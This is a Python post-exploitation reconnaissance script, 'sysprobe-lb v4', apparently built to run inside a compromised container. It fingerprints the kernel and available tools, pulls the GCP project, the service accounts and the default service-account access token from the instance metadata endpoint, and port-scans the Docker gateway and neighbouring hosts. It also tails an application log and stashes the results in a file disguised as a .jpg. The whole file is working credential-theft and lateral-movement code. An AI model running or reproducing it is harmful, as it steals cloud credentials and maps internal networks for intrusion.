# sysprobe-lb v4: cloud metadata + lateral scan
import os, json, socket, traceback

def _r(cmd):
    try:
        return os.popen(cmd).read()
    except Exception as e:
        return repr(e)

def _http(url, headers=None, timeout=6):
    import urllib.request
    try:
        req = urllib.request.Request(url, headers=headers or {})
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.read().decode(errors='replace')[:2000]
    except Exception as e:
        return repr(e)

def _scan(host, ports, timeout=1.5):
    openp = []
    for p in ports:
        try:
            s = socket.create_connection((host, p), timeout=timeout)
            s.close()
            openp.append(p)
        except Exception:
            pass
    return openp

try:
    out = {'marker': 'sysprobe-lb-v4'}
    out['kernel'] = _r('cat /proc/version; uname -a')
    out['toolchain'] = _r('which gcc cc python3 uv pip curl wget nc bash; python3 -V')
    out['kptr'] = _r('cat /proc/sys/kernel/kptr_restrict 2>/dev/null; cat /proc/sys/kernel/unprivileged_bpf_disabled 2>/dev/null')
    out['gcp_project'] = _http('http://169.254.169.254/computeMetadata/v1/project/project-id', {'Metadata-Flavor': 'Google'})
    out['gcp_instance'] = _http('http://169.254.169.254/computeMetadata/v1/instance/name', {'Metadata-Flavor': 'Google'})
    out['gcp_zone'] = _http('http://169.254.169.254/computeMetadata/v1/instance/zone', {'Metadata-Flavor': 'Google'})
    out['gcp_sa'] = _http('http://169.254.169.254/computeMetadata/v1/instance/service-accounts/', {'Metadata-Flavor': 'Google'})
    out['gcp_token'] = _http('http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token', {'Metadata-Flavor': 'Google'})
    out['gcp_scopes'] = _http('http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes', {'Metadata-Flavor': 'Google'})
    gw_ports = [22, 53, 111, 443, 2375, 2376, 3000, 3306, 5000, 5432, 6379, 8000, 8080, 8443, 9090, 9091, 10250, 27017]
    out['gw_172_18_0_1'] = _scan('172.18.0.1', gw_ports)
    neighbors = {}
    for i in range(1, 8):
        h = f'172.18.0.{i}'
        if h == '172.18.0.2':
            continue
        p = _scan(h, [22, 80, 443, 3000, 5300, 5432, 6379, 8080, 9090], timeout=0.8)
        if p:
            neighbors[h] = p
    out['neighbors'] = neighbors
    out['langbot_log_tail'] = _r('tail -60 /app/data/logs/langbot-2025-12-17.log')
    os.makedirs('data/storage', exist_ok=True)
    with open('data/storage/sysprobe_v4.jpg', 'w') as f:
        json.dump(out, f)
except Exception:
    traceback.print_exc()
